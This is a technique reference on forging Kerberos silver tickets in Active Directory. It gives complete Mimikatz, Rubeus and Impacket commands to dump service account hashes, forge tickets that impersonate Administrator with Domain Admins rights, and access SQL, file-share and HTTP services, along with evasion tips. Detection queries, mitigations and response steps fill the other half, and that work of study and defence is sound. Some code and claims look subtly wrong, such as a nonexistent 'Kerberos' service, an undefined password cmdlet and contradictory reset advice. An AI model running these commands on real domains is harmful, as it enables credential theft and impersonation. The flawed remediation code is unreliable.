# [CA-KERB-004]: Silver Ticket Forgery - Service-Specific Kerberos Ticket Injection

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-004 |
| **MITRE ATT&CK v18.1** | [T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket](https://attack.mitre.org/techniques/T1558/002/) |
| **Tactic** | Credential Access, Lateral Movement |
| **Platforms** | Windows AD (Server 2003 SP2+); all service accounts and machine accounts |
| **Severity** | High |
| **CVE** | N/A (Kerberos design limitation; April 2025 PAC validation patch partially addresses) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Windows Server 2003 SP2-2022; Windows 2025 (partially mitigated by April 2025 PAC validation patch) |
| **Patched In** | Partial mitigation: Windows April 2025 cumulative update enables mandatory PAC validation (reduces attack surface but does not eliminate it) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Silver tickets are fundamentally different from golden tickets: they target individual services rather than domain-wide access. They are MORE difficult to detect because they bypass the KDC entirely.

---

## 2. EXECUTIVE SUMMARY

**Concept:** A Silver Ticket is a forged Kerberos Service Ticket (TGS—Ticket Granting Service ticket, also called service ticket) created using the stolen password hash of a service account or machine account. Unlike golden tickets that require the KRBTGT hash and enable domain-wide access, silver tickets only require the hash of the specific target service account and enable access to that single service. The attacker forges a cryptographically valid TGS offline—on any machine—and presents it directly to the target service without ever contacting the Key Distribution Center (KDC). The target service validates the ticket using its own password hash and grants access based on the forged ticket's contents.

**Attack Surface:** Any service account or machine account password hash, obtained via:
1. **Kerberoasting** (crack service account hash from TGS)
2. **LSASS memory dump** (sekurlsa module)
3. **DCSync** (replication rights to extract service account hash)
4. **Credential stuffing** (obtain plaintext, hash locally)
5. **Machine account harvesting** (computer$ accounts rotate every 30 days)

Common high-value targets: SQL Server, file shares (CIFS), HTTP services, domain controller machine accounts (HOST/RestrictedKrbHost).

**Business Impact:** **Service-specific compromise with persistent, cryptographically valid access.** Unlike golden tickets (domain-wide), silver tickets enable:
- Access to a **specific service** (SQL Server, file share, web app) without elevation to domain admin
- **Stealthy lateral movement** to individual services without touching KDC
- **Persistence** despite service account password resets (if attacker retains hash from before reset)
- **Minimal audit trail** (no 4768 TGT request on DC; only 4769 on target machine)

Silver tickets are **preferred for stealthy, targeted attacks** where the attacker has specific services in mind.

**Technical Context:** Silver tickets are **harder to detect** than golden tickets because they bypass the KDC entirely. Detection must occur on the target service machine (via 4769 events) and requires correlation with behavioral analysis. Windows April 2025 patch introduced mandatory PAC (Privilege Attribute Certificate) validation, which partially mitigates the attack but does not eliminate it.

### Operational Risk
- **Execution Risk:** Low - Requires only target service account hash (easier to obtain than KRBTGT)
- **Stealth:** Very High - No KDC interaction; no domain controller logging (only local 4769 on target machine)
- **Reversibility:** No - Persistent unless service account password is reset AND attacker doesn't retain the old hash

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.3.1.1, 5.3.2.1 | Enable Kerberos pre-authentication; monitor unusual service account logon behavior; enforce PAC validation |
| **DISA STIG** | WN16-AU-000050 | Ensure 'Audit Account Management' enabled for service account changes |
| **CISA SCuBA** | ID.AM-2, PR.AC-1, DE.AE-3 | Asset management; access control; detection of credential access |
| **NIST 800-53** | AC-2 (Account Management), AC-3 (Access Enforcement), SI-4 (System Monitoring) | Monitor service account access; log TGS activity; enable PAC validation |
| **GDPR** | Art. 5 (Principles), Art. 32 (Security of Processing) | Ensure integrity and confidentiality of authentication; protective measures |
| **DORA** | Art. 9 (Protection), Art. 10 (Detection & Response) | Protect service account credentials; detect unauthorized service access |
| **NIS2** | Art. 21 (Cyber Risk Management), Art. 23 (Access Control), Art. 24 (Cryptography) | Manage service account risks; enforce strong authentication |
| **ISO 27001** | A.9.2.3 (Privileged Access Management), A.10.1.1 (Information Classification) | Control service account access; monitor authentication activity |
| **ISO 27005** | Risk Scenario: "Service Account Hash Compromise and Silver Ticket Generation" | Assess probability of service account compromise; implement controls |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Possession of target service account NT hash or AES key
- **Required Access:** Network connectivity to target service (no DC access required; forged ticket created offline)

**Supported Versions:**
- **Windows Server:** 2003 SP2, 2008, 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Service Accounts:** Any account with registered SPN (SQL Server, HTTP, CIFS, LDAP, etc.)
- **Machine Accounts:** Domain-joined computers with running services

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (v2.2.0+, primary tool)
- [Rubeus](https://github.com/GhostPack/Rubeus) (v2.3.3, C# alternative with LDAP integration)
- [Impacket Ticketer.py](https://github.com/SecureAuthCorp/impacket) (Python cross-platform)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Identify Target Service Accounts and SPNs

```powershell
# Enumerate all service accounts with SPNs (potential silver ticket targets)
Get-ADUser -Filter {servicePrincipalName -ne $null} -Properties servicePrincipalName, sAMAccountName | 
  Select-Object sAMAccountName, servicePrincipalName

# Expected output:
# sAMAccountName       : SQLService
# servicePrincipalName : {MSSQLSvc/sqlserver.domain.local:1433}

# sAMAccountName       : WebService
# servicePrincipalName : {HTTP/webapp.domain.local, HTTP/webapp.domain.local:443}
```

### Step 2: Enumerate Machine Accounts (Computer$ accounts)

```powershell
# Machine accounts are often targets (can impersonate any user to that machine via HOST SPN)
Get-ADComputer -Filter * -Properties servicePrincipalName | 
  Select-Object Name, servicePrincipalName | 
  Where-Object { $_.servicePrincipalName -like "*HOST*" }

# Example output shows domain-joined servers with HOST SPNs
```

### Step 3: Target Service Account Assessment

```powershell
# Determine which service account is highest value
# Criteria: Privilege level, data access, system criticality

# Check if service account is in privileged groups
Get-ADUser -Identity "SQLService" -Properties MemberOf | 
  Select-Object MemberOf | 
  Where-Object { $_.MemberOf -match "Admin" }

# Check when password was last set (older = higher compromise risk)
Get-ADUser -Identity "SQLService" -Properties pwdLastSet | 
  Select-Object Name, pwdLastSet
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Silver Ticket Creation with Mimikatz

**Supported Versions:** Server 2003 SP2 through 2025

#### Step 1: Extract Target Service Account Hash

**Objective:** Obtain the NT hash of the target service account (prerequisite for silver ticket creation).

```powershell
# Option 1: Via Kerberoasting (extract from TGS)
# Get TGS for service and crack hash offline (see CA-KERB-001 Kerberoasting documentation)

# Option 2: Via Mimikatz on compromised host with admin rights
mimikatz # sekurlsa::logonpasswords
# Filter output for target service account
# Look for: NTLM hash of the service account

# Option 3: Via DCSync (if you have replication rights)
mimikatz # lsadump::dcsync /user:SQLService
```

**Expected Output (sekurlsa):**
```
Authentication Id : 0 ; 26728 (00000000:000068D8)
Session           : Interactive from 0
User Name         : SQLService
Domain            : PENTESTLAB
Logon Server      : DC01
Logon Time        : 1/6/2026 8:00:00 AM
SID               : S-1-5-21-3737340914-2019594255-2413685307-1106

 * Username : SQLService
 * Domain   : PENTESTLAB.LOCAL
 * Password : (null)
 * Key List :
    aes256_hmac       : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
    rc4_hmac/ntlm     : d125e4f69c851529045ec95ca80fa37e
```

**What This Means:**
- NTLM hash (RC4): `d125e4f69c851529045ec95ca80fa37e` (use for /rc4 or /krbtgt flag in silver ticket)
- AES256 hash: For modern AES-based silver tickets (more secure but still crackable)

#### Step 2: Create Silver Ticket (Offline, Any Machine)

**Objective:** Forge a TGS signed with the service account hash for the specific service.

```powershell
# Basic silver ticket to SQL Server
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /target:sqlserver.pentestlab.local /service:MSSQLSvc /rc4:d125e4f69c851529045ec95ca80fa37e /ptt

# Silver ticket to file share (CIFS)
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /target:fileserver.pentestlab.local /service:CIFS /rc4:FILE_SERVICE_HASH /ptt

# Silver ticket to HTTP service
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /target:webapp.pentestlab.local /service:HTTP /rc4:HTTP_SERVICE_HASH /ptt

# Silver ticket with extended privilege (Domain Admin group within service scope)
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /target:fileserver.pentestlab.local /service:CIFS /groups:512 /rc4:FILE_SERVICE_HASH /ptt

# Save to file instead of injecting
mimikatz # kerberos::golden /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /target:sqlserver.pentestlab.local /service:MSSQLSvc /rc4:HASH /ticket:silver.kirbi
```

**Expected Output:**
```
User      : Administrator
Domain    : pentestlab.local
SID       : S-1-5-21-3737340914-2019594255-2413685307
User ID   : 500
Group ID  : 513
ServiceKey: d125e4f69c851529045ec95ca80fa37e (RC4-HMAC)
Service   : MSSQLSvc
Target    : sqlserver.pentestlab.local
Lifetime  : 600 minutes
->Ticket  : silver.kirbi

Silver ticket generation
  * for service   : MSSQLSvc/sqlserver.pentestlab.local
  * for user      : Administrator
  * creation time : 1/6/2026 9:30 AM
  * ending time   : 1/6/2026 7:30 PM
  ...
  [+] Silver ticket for 'MSSQLSvc/sqlserver.pentestlab.local' successfully submitted for current session
```

**What This Means:**
- Forged TGS is now in the Kerberos ticket cache
- Attacker can authenticate to SQL Server as Administrator
- No 4768 event on DC (ticket created offline)
- Only 4769 on SQL Server machine (if logging enabled)

**Key Parameters:**
- `/service:` Service class (MSSQLSvc, CIFS, HTTP, LDAP, etc.)
- `/target:` Target computer or domain name
- `/user:` Username to impersonate
- `/groups:` Optional group RIDs for privilege escalation within service
- `/rc4:` Target service account NT hash
- `/ptt:` Pass-the-ticket (inject immediately)

**OpSec & Evasion:**
- No `/ptt` flag: Save to file, inject later with `kerberos::ptt` (less suspicious)
- Use non-admin user IDs when possible
- Vary ticket lifetimes to avoid predictable patterns

**Version-Specific Notes:** Identical behavior across all Windows versions 2003 SP2-2025.

#### Step 3: Use Silver Ticket for Service Access

```powershell
# Exit Mimikatz
exit

# Now authenticated to target service
# For SQL Server
sqlcmd -S sqlserver.pentestlab.local -E  # -E = use current Kerberos credentials

# For file share
dir \\fileserver.pentestlab.local\SharedFolder

# For HTTP service
Invoke-WebRequest -Uri "http://webapp.pentestlab.local" -UseDefaultCredentials
```

---

### METHOD 2: Silver Ticket with Rubeus

**Supported Versions:** Server 2003 SP2 through 2025

```powershell
# Silver ticket to SQL Server with LDAP auto-lookup
Rubeus.exe silver /rc4:SERVICE_HASH /user:Administrator /service:MSSQLSvc /ldap /ptt

# Or with explicit values
Rubeus.exe silver /rc4:d125e4f69c851529045ec95ca80fa37e /user:Administrator /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /service:MSSQLSvc /target:sqlserver.pentestlab.local /ptt

# With S4U2Proxy delegation (advanced)
Rubeus.exe silver /rc4:HASH /user:Administrator /service:MSSQLSvc /s4uproxytarget:TARGET_SPN /ldap /ptt

# Save to file
Rubeus.exe silver /rc4:HASH /user:Administrator /service:CIFS /target:fileserver.pentestlab.local /outfile:silver.kirbi
```

---

### METHOD 3: Silver Ticket with Impacket (Linux/Cross-Platform)

**Supported Versions:** Server 2003 SP2 through 2025

```bash
# Create silver ticket to SQL Server
python3 ticketer.py -nthash SERVICE_HASH \
  -domain-sid S-1-5-21-3737340914-2019594255-2413685307 \
  -domain pentestlab.local \
  -spn MSSQLSvc/sqlserver.pentestlab.local \
  -user-id 500 \
  Administrator

# With group membership (Domain Admins SID = 512)
python3 ticketer.py -nthash SERVICE_HASH \
  -domain-sid S-1-5-21-3737340914-2019594255-2413685307 \
  -domain pentestlab.local \
  -spn CIFS/fileserver.pentestlab.local \
  -user-id 500 \
  -extra-sid S-1-5-21-3737340914-2019594255-2413685307-512 \
  Administrator

# Output as .ccache file (Linux Kerberos format)
# Use with impacket tools
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass pentestlab.local/Administrator@sqlserver.pentestlab.local
```

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Test #1: Silver Ticket Creation (T1558.002)

- **Atomic Test ID:** `Multiple tests available`
- **Test Name:** Silver Ticket Forgery
- **Description:** Create and inject forged service ticket
- **Supported Versions:** All Windows versions (requires Mimikatz or Rubeus)

**Execution:**
```powershell
Invoke-AtomicTest T1558.002 -TestNumbers 1
```

---

## 7. TOOLS & COMMANDS REFERENCE

#### [Mimikatz - Silver Ticket Module](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+  
**Primary Command:** `kerberos::golden` (with /service parameter = silver ticket)

**Key Parameters:**
```
/user:          Username to impersonate
/domain:        Domain FQDN
/sid:           Domain SID
/rc4:           Service account NT hash
/aes128:        Service account AES128 key
/aes256:        Service account AES256 key
/target:        Target machine/domain
/service:       Service class (MSSQLSvc, CIFS, HTTP, LDAP, etc.)
/groups:        Group RIDs to include (512=Domain Admins)
/ptt:           Pass-the-ticket (inject)
/ticket:        Save to file instead of inject
```

#### [Rubeus - Silver Ticket Command](https://github.com/GhostPack/Rubeus)

**Version:** 2.3.3+  
**Command:** `silver /rc4:HASH /user:USERNAME /service:SPN /ptt`

**Advantages:**
- LDAP integration (auto-gathers domain info)
- S4U delegation support (advanced)
- Cleaner output than Mimikatz

#### [Impacket Ticketer.py](https://github.com/SecureAuthCorp/impacket)

**Cross-Platform:** Works on Linux, macOS, Windows
**Output Format:** `.ccache` (Linux Kerberos credentials cache)
**Integration:** Compatible with psexec.py, wmiexec.py, other impacket tools

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Service Ticket Requests Without KDC Interaction (4769 Without 4768 on DC)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID (4768, 4769), Account, Computer
- **Alert Severity:** High
- **Frequency:** Every 15 minutes (service-specific detection is local, requires server-side log forwarding)
- **Applies To Versions:** All versions (Server 2016+ recommended for enhanced logging)

**KQL Query:**
```kusto
// Collect all 4768 events from DCs in the last 2 hours
let TGT_Requests = SecurityEvent
| where EventID == 4768
| where Computer has "DC"
| project Account_TGT = TargetUserName, DC = Computer, Time_TGT = TimeGenerated
| distinct Account_TGT, DC, Time_TGT;

// Find 4769 events on non-DC machines (service machines)
SecurityEvent
| where EventID == 4769
| where Computer !has "DC"  // Service-specific event, not on DC
| join kind=leftanti TGT_Requests on $left.TargetUserName == $right.Account_TGT
| summarize
    TGS_Count = count(),
    Services = make_set(ServiceName),
    Sources = make_set(SourceIPAddress)
    by Computer, TargetUserName, bin(TimeGenerated, 15m)
| where TGS_Count >= 3  // Multiple TGS requests without prior TGT
| project TimeGenerated, Computer, TargetUserName, TGS_Count, Services, Sources
```

**What This Detects:**
- TGS requests (4769) on service machines WITHOUT corresponding TGT requests (4768) on DC
- Indicates potential silver ticket usage (bypassing KDC)
- Requires Event Forwarding from service machines to SIEM

#### Query 2: Unusual Service Account Logon Activity

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID 4624 (logon type 3 - network), TargetUserName
- **Alert Severity:** Medium
- **Frequency:** Every 30 minutes

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4624  // Successful logon
| where LogonType == 3   // Network logon
| where TargetUserName matches regex ".*svc.*|.*service.*|.*SQL.*|.*HTTP.*"  // Service account patterns
| summarize
    Logon_Count = count(),
    Source_IPs = make_set(SourceIPAddress),
    Target_Machines = make_set(Computer)
    by TargetUserName, bin(TimeGenerated, 30m)
| where Logon_Count >= 5  // Unusual number of logons for service account
| project TimeGenerated, TargetUserName, Logon_Count, Source_IPs, Target_Machines
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4769 (Service Ticket Request)**
- **Log Source:** Security (on service machines, not DC)
- **Critical Fields:**
  - `TargetUserName` (account impersonated)
  - `ServiceName` (target service SPN)
  - `SourceIPAddress` (source of request)
  - Absence of preceding 4768 = suspicious

**Event ID: 4624 (Successful Logon)**
- **Log Type:** Type 3 (network logon)
- **Critical Fields:**
  - `TargetUserName` (impersonated user)
  - `SourceIPAddress` (source IP of connection)
  - Unusual times/IPs for service account = suspicious

### Manual Monitoring Configuration

**Enable 4769 Logging on Service Machines:**

```powershell
# On service machines (SQL Server, file servers, web servers)
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Kerberos Service Ticket Operations"
```

**Hunt for Silver Tickets (Local Event Log Analysis):**

```powershell
# Search for 4769 events on service machine
Get-WinEvent -FilterXPath "*[System[(EventID=4769)]]" -LogName Security -MaxEvents 500 | 
  Select-Object TimeCreated, @{N="Account";E={$_.Properties[0].Value}}, @{N="Service";E={$_.Properties[2].Value}} | 
  Export-Csv "C:\Logs\Service_Tickets_24h.csv"

# Filter for suspicious patterns
Get-WinEvent -FilterXPath "*[System[(EventID=4769)]] and EventData[Data[@Name='TicketEncryptionType']='0x17']" `
  -LogName Security | 
  Select-Object TimeCreated, @{N="User";E={$_.Properties[0].Value}} | 
  Group-Object User | 
  Where-Object { $_.Count -gt 10 }  # More than 10 TGS requests = suspicious
```

---

## 10. FORENSIC ARTIFACTS & INDICATORS OF COMPROMISE

**Disk Artifacts:**
- Mimikatz binary, Rubeus.exe, ticketer.py in `%TEMP%`, working directories
- `.kirbi` files (Kerberos ticket files)
- Tool execution logs or evidence of hash extraction

**Memory Artifacts:**
- Service account hash in attacker's memory (if extracted via sekurlsa)
- Injected `.kirbi` file in LSASS memory (if /ptt used)

**Event Log Artifacts (Service Machine):**
- **Event 4769** (TGS request) without preceding 4768 (TGT) on DC
- **Event 4624** (logon type 3 - network) for service account from unusual IPs/times
- **Clustering of 4769 events** in short time window (bulk access to service)

**Network Artifacts:**
- Access to target service from unexpected source IPs
- Rapid-fire authentication attempts to service
- Service access outside normal business hours/locations

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Enable Mandatory PAC Validation (April 2025+ Windows Patch)**

The April 2025 cumulative security update introduces **mandatory PAC validation**, which significantly weakens silver ticket attacks.

**Applies To Versions:** Windows Server 2016+ with April 2025 security patch installed

**Manual Steps (Patch & Verify):**

```powershell
# Ensure system is updated to April 2025 cumulative patch or later
Get-WindowsUpdate | Where-Object { $_.Title -like "*April 2025*" }

# Verify PAC validation is enabled
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
  -Name "ValidateKdcPacSignature"

# If not set, enable it
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
  -Name "ValidateKdcPacSignature" -Value 1 -Type DWord

# Restart service
Restart-Service Kerberos -Force
```

**Important:** PAC validation is now **mandatory** in April 2025+ patches. This prevents attackers from modifying privilege information in forged silver tickets.

**Impact:** Silver tickets with forged PACs will fail on updated systems. However, attackers can still create valid silver tickets if they have the service account hash.

**Action 2: Enforce Strong Passwords and Frequent Rotation for Service Accounts**

Service account hashes are primary targets. Strong, rotated passwords prevent effective offline cracking.

**Applies To Versions:** Server 2003 SP2 through 2025

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Create/edit GPO for service accounts
3. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
4. Configure:
   - **Minimum password length:** 30 characters (minimum; 40+ recommended for service accounts)
   - **Password expires in:** 45-60 days (force rotation before attacker can crack)
   - **Password history:** 24 previous passwords (prevent reuse)
5. Apply and force replication

**Or, via Fine-Grained Password Policy:**

```powershell
# Create strict policy for service accounts
New-ADFineGrainedPasswordPolicy -Name "ServiceAccountPolicy" `
  -Complexity $true `
  -MinPasswordLength 40 `
  -PasswordHistoryCount 24 `
  -MaxPasswordAge 45 `
  -LockoutDuration 00:30:00 `
  -LockoutThreshold 5 `
  -Precedence 1

# Apply to service account OU
Add-ADFineGrainedPasswordPolicySubject -Identity "ServiceAccountPolicy" `
  -Subject "CN=ServiceAccounts,CN=Users,DC=pentestlab,DC=local"
```

**Action 3: Migrate Service Accounts to Group Managed Service Accounts (gMSA)**

gMSA accounts have automatically rotating 256-byte passwords (every 30 days by default), making silver ticket attacks impractical.

**Applies To Versions:** Server 2012 R2+ (gMSA); Server 2025 (dMSA for better migration)

**Manual Steps:**

```powershell
# Step 1: Create KDS Root Key (one-time per domain)
Add-KDSRootKey -EffectiveImmediately

# Step 2: Create gMSA
New-ADServiceAccount -Name "SQLService_gMSA" `
  -Description "Managed account for SQL Server" `
  -Enabled $true

# Step 3: Assign computers that can use the account
Set-ADServiceAccount -Identity "SQLService_gMSA" `
  -PrincipalsAllowedToRetrieveManagedPassword "CN=SQLServers,CN=Computers,DC=pentestlab,DC=local"

# Step 4: On target service server, install gMSA
Install-ADServiceAccount -Identity "SQLService_gMSA"

# Step 5: Configure service to use gMSA (no password needed; gMSA manages it)
# For SQL Server: Use DOMAIN\SQLService_gMSA$ in service logon account
```

**Verification:**

```powershell
Test-ADServiceAccount -Identity "SQLService_gMSA"  # Should return $true
```

### Priority 2: HIGH

**Action 1: Monitor Service Account Hash Extraction (Kerberoasting Prevention)**

Prevent attackers from obtaining service account hashes in the first place.

```powershell
# Monitor for Kerberoasting
Get-WinEvent -FilterXPath "*[System[(EventID=4769)]]" -LogName Security -MaxEvents 1000 | 
  Where-Object { $_.Properties[10].Value -eq "0x17" } | # RC4 encryption = crackable
  Group-Object { $_.Properties[0].Value } | # Group by target account
  Where-Object { $_.Count -gt 10 }  # More than 10 TGS requests = suspicious

# Alert on suspicious activity
Write-Host "[ALERT] Potential Kerberoasting detected" -ForegroundColor Red
```

**Action 2: Restrict Service Account Privileges (Least Privilege)**

Limit service accounts to minimal required permissions.

```powershell
# Remove unnecessary group memberships
Remove-ADGroupMember -Identity "Domain Admins" -Members "SQLService" -Confirm:$false

# Grant specific role-based permissions instead
Add-ADGroupMember -Identity "SQL_Admins" -Members "SQLService"
```

**Action 3: Enable AES Encryption Only (Disable RC4)**

AES encryption is stronger than RC4; disable RC4 for Kerberos.

```powershell
# Force AES-only Kerberos encryption
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" `
  -Name "SupportedEncTypes" -Value 24 -Type DWord

# Value 24 = AES128 + AES256 (secure)
# Restart affected services
```

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- Mimikatz binary, Rubeus.exe, ticketer.py in service machine working directories
- `.kirbi` ticket files
- Service account hash dumps

**Registry:**
- Kerberos registry modifications (unusual)

**Event Log:**
- **4769 without preceding 4768** (silver ticket usage)
- **Multiple 4769 events** for same user/service in short window
- **4624 logon type 3** for service account from unexpected IPs

**Network:**
- Direct service access without prior TGT request (if network capture available)
- Service access outside normal business hours

### Response Procedures

#### 1. Immediate Containment (Minutes 0-15)

**Reset Target Service Account Password:**

```powershell
# Immediately reset compromised service account password
$newPassword = GenerateComplexPassword 40  # 40-character random
Set-ADAccountPassword -Identity "SQLService" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText $newPassword -Force)

# This invalidates the silver ticket (but only for future tickets with new hash)
# Old silver tickets remain valid until service account password changed
```

**Isolate Target Service (if High-Risk):**

```powershell
# Disconnect service machine from network if critical data access
# Or block access at firewall

# Disable service account temporarily
Disable-ADAccount -Identity "SQLService"

# Stop vulnerable service
Stop-Service -Name MSSQLSERVER -Force
```

#### 2. Evidence Collection (Minutes 15-60)

```powershell
# Export 4769 events from service machine for last 24 hours
wevtutil epl Security "C:\Evidence\Security_4769_24h.evtx" `
  /q:"*[System[(EventID=4769) and TimeCreated[timediff(@SystemTime) <= 86400000]]]"

# Export 4624 events for service account
wevtutil epl Security "C:\Evidence\Service_Logons_24h.evtx" `
  /q:"*[System[(EventID=4624) and TimeCreated[timediff(@SystemTime) <= 86400000]]] and EventData[Data[@Name='TargetUserName']='SQLService']"

# Check for hash dumps in temporary files
Get-ChildItem -Path "C:\Windows\Temp" -Include "*hash*", "*ticket*", "*.kirbi" -Force -ErrorAction SilentlyContinue
```

#### 3. Remediation (Hours 1-4)

**Reset ALL Service Account Passwords (2x Reset Pattern):**

```powershell
# First reset
Set-ADAccountPassword -Identity "SQLService" -Reset -NewPassword (GenerateComplexPassword 40)
Start-Sleep -Seconds 36000  # Wait 10 hours (default TGS lifetime)

# Second reset (invalidates any in-flight silver tickets)
Set-ADAccountPassword -Identity "SQLService" -Reset -NewPassword (GenerateComplexPassword 40)
```

**Or, Migrate to gMSA (Permanent Fix):**

```powershell
# Use gMSA to eliminate the need for stored passwords
New-ADServiceAccount -Name "SQLService_gMSA" ...
# Then configure service to use gMSA
```

#### 4. Investigation (Hours 4+)

**Timeline Reconstruction:**

1. Identify first 4769 event on service machine (silver ticket usage)
2. Correlate with hash extraction events (Kerberoasting 4769s on DC, or sekurlsa execution)
3. Trace back to initial compromise (phishing, RDP, supply chain)
4. Identify all services accessed via silver ticket
5. Determine data exfiltration scope

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566 - Phishing] | Attacker gains foothold |
| **2** | **Execution** | [T1204 - User Execution] | User opens malicious document |
| **3** | **Privilege Escalation** | [T1548 - Abuse Elevation] | Escalate to local admin or domain user |
| **4** | **Credential Access** | [T1558.003 - Kerberoasting] OR [T1003 - OS Credential Dumping] | Extract service account hash |
| **5** | **Credential Access - Current** | **[CA-KERB-004: Silver Ticket]** | **Forge TGS for target service** |
| **6** | **Lateral Movement** | [T1021.002 - RDP] or service-specific access | Use silver ticket to access service |
| **7** | **Data Exfiltration** | [T1020 - Data Transfer Size Limits] | Exfiltrate data from accessed service |
| **8** | **Impact** | [T1565 - Data Destruction] | Destroy or encrypt data |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: File Share Compromise via CIFS Silver Ticket

- **Target:** Enterprise file server (SYSVOL backup)
- **Attack Method:**
  1. Kerberoasting: Crack CIFS service account hash from TGS request
  2. Silver ticket creation: Forge TGS for CIFS/fileserver
  3. Access: Mount file share as Domain Admin user
  4. Data theft: Copy SYSVOL contents (contains password hints, scripts)
  5. Escalation: Use stolen credentials to compromise additional systems
- **Detection Gap:** 4769 events on file server not forwarded to SIEM
- **Impact:** Full SYSVOL compromise; lateral movement to entire domain

#### Example 2: SQL Server Silver Ticket (Wizard Spider Campaign 2024)

- **Target:** Enterprise SQL Server hosting customer data
- **Attack Method:**
  1. Initial compromise: RDP exploitation
  2. Enumeration: Identify SQL Server service account via Get-ADUser
  3. Hash extraction: Kerberoasting or Mimikatz on compromised server
  4. Silver ticket: Forge TGS for MSSQLSvc/sqlserver
  5. Access: Connect as Domain Admin to SQL Server
  6. Data breach: Query and exfiltrate customer database
- **Persistence:** Silver tickets remain valid until SQL service account password reset
- **Impact:** Database compromise; customer data breach; regulatory penalties

#### Example 3: Constrained Delegation Abuse via Silver Ticket (Advanced)

- **Target:** Server with constrained delegation privileges
- **Attack Method:**
  1. Compromise source server (allowed to delegate)
  2. Forge silver ticket for S4U2Self (user impersonation)
  3. Use S4U2Proxy to request service ticket to target service
  4. Access restricted service as arbitrary user
- **Stealthiness:** Very high; appears as normal delegation
- **Impact:** Full lateral movement chain without explicit compromise of each service

---